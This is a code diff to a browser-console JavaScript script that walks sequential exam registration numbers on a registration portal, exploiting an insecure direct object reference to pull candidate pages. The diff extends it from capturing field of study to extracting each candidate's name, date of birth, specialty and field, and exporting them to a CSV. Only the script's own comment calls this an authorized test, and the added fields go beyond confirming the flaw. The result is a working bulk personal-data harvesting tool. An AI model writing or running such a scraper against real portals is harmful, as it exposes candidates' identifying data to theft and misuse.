@@ -4,8 +4,8 @@
  * Authorized security-testing utility: bulk-checks a range of exam
  * registration numbers (matricules) against a registration portal to
  * confirm whether an IDOR (Insecure Direct Object Reference) exposes
- * candidate records — including "filière" (field of study) — to any
- * unauthenticated visitor who can guess a sequential ID.
+ * candidate records — including name, date of birth, spécialité and
+ * filière — to any unauthenticated visitor who can guess a sequential ID.
  *
  * Usage: run in the browser DevTools console while on the target
  * origin, inside the scope of an authorized penetration test / bug
@@ -19,6 +19,35 @@
     const debut = 1;
     const fin = 150;
     const resultat = [];
+
+    // Libellés recherchés pour chaque champ, du plus spécifique au plus générique
+    const champsRecherches = {
+        Nom: /\bnoms?\s*(et\s*pr[ée]nom)?\b/i,
+        DateNaissance: /date\s*de\s*naissance|n[ée]\(?e?\)?\s*le/i,
+        Specialite: /sp[ée]cialit[ée]/i,
+        Filiere: /fili[èe]re|formation/i
+    };
+
+    function extraireChamp(doc, regex) {
+        const elements = [...doc.querySelectorAll("input, select, textarea, td, th, label, p, span, div")];
+
+        for (const element of elements) {
+            const texte = element.textContent.trim();
+
+            if (regex.test(texte)) {
+                const valeur =
+                    element.value ||
+                    element.nextElementSibling?.textContent?.trim() ||
+                    texte;
+
+                if (valeur && valeur.length > 1) {
+                    return valeur.replace(/\s+/g, " ").trim();
+                }
+            }
+        }
+
+        return "";
+    }
 
     console.log("🔎 Vérification des matricules...");
 
@@ -35,36 +64,26 @@
                 html.includes(matricule) &&
                 html.includes("Inscription au concours");
 
+            let nom = "";
+            let dateNaissance = "";
+            let specialite = "";
             let filiere = "";
 
             if (existe) {
                 const doc = new DOMParser().parseFromString(html, "text/html");
 
-                // Recherche des champs susceptibles de contenir la filière
-                const elements = [...doc.querySelectorAll("input, select, textarea, td, th, label, p, span, div")];
-
-                for (const element of elements) {
-                    const texte = element.textContent.trim();
-
-                    if (
-                        /filière|filiere|spécialité|specialite|formation/i.test(texte)
-                    ) {
-                        const valeur =
-                            element.value ||
-                            element.nextElementSibling?.textContent?.trim() ||
-                            texte;
-
-                        if (valeur && valeur.length > 5) {
-                            filiere = valeur.replace(/\s+/g, " ").trim();
-                            break;
-                        }
-                    }
-                }
+                nom = extraireChamp(doc, champsRecherches.Nom);
+                dateNaissance = extraireChamp(doc, champsRecherches.DateNaissance);
+                specialite = extraireChamp(doc, champsRecherches.Specialite);
+                filiere = extraireChamp(doc, champsRecherches.Filiere);
             }
 
             resultat.push({
                 Matricule: matricule,
                 Existe: existe ? "OUI" : "NON",
+                Nom: nom,
+                DateNaissance: dateNaissance,
+                Specialite: specialite,
                 Filiere: filiere,
                 Lien: existe
                     ? new URL(url, window.location.origin).href
@@ -72,13 +91,16 @@
             });
 
             console.log(
-                `${i}/150 — ${matricule} → ${existe ? "✅" : "❌"} ${filiere}`
+                `${i}/150 — ${matricule} → ${existe ? "✅" : "❌"} ${nom} ${filiere}`
             );
 
         } catch (erreur) {
             resultat.push({
                 Matricule: matricule,
                 Existe: "ERREUR",
+                Nom: "",
+                DateNaissance: "",
+                Specialite: "",
                 Filiere: "",
                 Lien: ""
             });
@@ -91,10 +113,13 @@
 
     // Export CSV compatible Excel
     const lignes = [
-        ["Matricule", "Existe", "Filière concourue", "Lien"],
+        ["Matricule", "Existe", "Nom", "Date de naissance", "Spécialité", "Filière concourue", "Lien"],
         ...resultat.map(x => [
             x.Matricule,
             x.Existe,
+            x.Nom,
+            x.DateNaissance,
+            x.Specialite,
             x.Filiere,
             x.Lien
         ])
